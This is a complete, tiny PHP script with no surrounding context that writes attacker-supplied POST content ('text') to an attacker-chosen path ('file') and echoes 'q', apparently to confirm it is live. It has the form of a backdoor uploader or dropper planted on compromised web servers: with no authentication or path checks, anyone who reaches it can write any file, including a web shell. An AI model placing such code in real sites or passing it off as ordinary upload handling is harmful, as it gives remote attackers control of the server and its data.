<?php
$data = $_POST["text"];
$file = $_POST["file"];
file_put_contents($file,$data);
echo "q";
?>
